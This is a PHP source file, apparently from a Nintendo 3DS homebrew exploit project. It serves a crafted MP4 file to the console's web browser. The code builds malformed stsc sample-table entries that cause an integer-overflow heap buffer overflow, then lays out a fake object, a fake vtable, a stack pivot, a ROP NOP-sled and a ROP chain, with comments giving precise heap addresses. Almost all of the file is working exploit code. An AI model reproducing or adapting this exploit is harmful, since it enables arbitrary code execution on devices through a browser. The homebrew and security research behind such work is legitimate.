<?php

include_once("/home/yellows8/browserhax/browserhax_cfg.php");

include_once("3dsbrowserhax_common.php");

if(($browserver & 0x80) == 0)
{
	echo "This browser is not supported.\n";
	//error_log("browserhax_fright.php: BROWSER NOT SUPPORTED.");
	exit;
}

$con = file_get_contents("frighthax_header.mp4");

$url_len = strlen("http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']) + 1;//The address of the below mp4 buffer varies depending on the length of the requested URL. Only URLs with string length < 48 characters is currently supported(without updating the below code).
$baseaddr = 0x39531f00;
if($url_len < 33)
{
	$baseaddr = 0x39531ea0;
}
else
{
	if($url_len < 41)
	{
		$url_len-= 32;
	}
	else
	{
		$url_len-= 40;
		$baseaddr = 0x39531f10;
	}
}
$heapaddr_stscarraydata_off_x1200 = /*0x39531c88*/$baseaddr+0x577+0x1201 + (($url_len + 0x3) & ~0x3);
//$heapaddr_stscarraydata_off_x1200 = 0x39533680;//Offset 0x1201 relative to the stsc entries data start, in the buffer containing the *entire* raw mp4. This hax will work fine as long as this address lands at <stsc entries data start>+0x201 .. <stsc entries data start>+0x21f1, and is 0x10-byte aligned relative to <stsc entries data start>+0x201.
$fake_vtableptr = $heapaddr_stscarraydata_off_x1200+0x2000;
$stackptr = $fake_vtableptr+0x2000;

$ROPHEAP = 0x10000000-0x1e000;//0x08100000;//Don't use any memory nearby the above mp4 buffer, since that causes corruption issues.

$generatebinrop = 1;
generate_ropchain();

$entry_wordindex = 0;

for($i=0; $i<0x200; $i+=4)//Setup the data which will get copied to the output buffer. When that data is copied, each word in the entry is converted to machine-endian, and the first word value is decreased by 1. The allocated output buffer is only 0x18-bytes(due to integer overflow), hence this will result in a buffer overflow. This will overwrite the objectptr used for reading data, hence data-reading will stop at the time the overwritten object gets used.
{
	$writeval = $heapaddr_stscarraydata_off_x1200;
	if($entry_wordindex == 0)$writeval++;
	$con.= pack("N*", $writeval);
	
	$entry_wordindex++;
	if($entry_wordindex==2)$entry_wordindex = 0;
}

$con.= pack("C*", 0x0);//Align the offset after this, and as a result the address, to 4-bytes.

for($i=0; $i<(0x2000/0x10); $i++)//Setup the data which will be used at offset 0x1200 relative to the stsc entries data start, in the buffer containing the *entire* raw mp4. This is where the object data for the above objectptr is located.
{
	$con.= pack("V*", $fake_vtableptr);//Fake vtable ptr, the 0x34-bytes starting here is also popped into r0..ip during stack-pivot.
	//for($pos=0x4; $pos<0x34; $pos+=4)$con.= pack("V*", $fake_vtableptr);//Setup r1..ip for the stack-pivot.
	$con.= pack("V*", $stackptr);//Setup sp for the stack-pivot.
	$con.= pack("V*", $POPPC);//Setup lr for the stack-pivot.
	$con.= pack("V*", $POPPC);//Setup pc for the stack-pivot.
}

for($i=0; $i<0x2000; $i+=4)//Setup the data which will be used at offset 0x1200+0x2000 relative to the stsc entries data start, in the buffer containing the *entire* raw mp4. This is where the fake vtable for the above object is located.
{
	$con.= pack("V*", $STACKPIVOT_ADR);
}

for($i=0; $i<0x2000; $i+=4)//Setup the data which will be used at offset 0x1200+0x2000+0x2000 relative to the stsc entries data start, in the buffer containing the *entire* raw mp4. This is where the ROP stack is located, starting with a ROP NOP-sled.
{
	$con.= pack("V*", $POPPC);
}

$con.= $ROPCHAIN;//Beginning of the actual ROP.

header("Content-Type: video/mp4");

echo $con;

?>
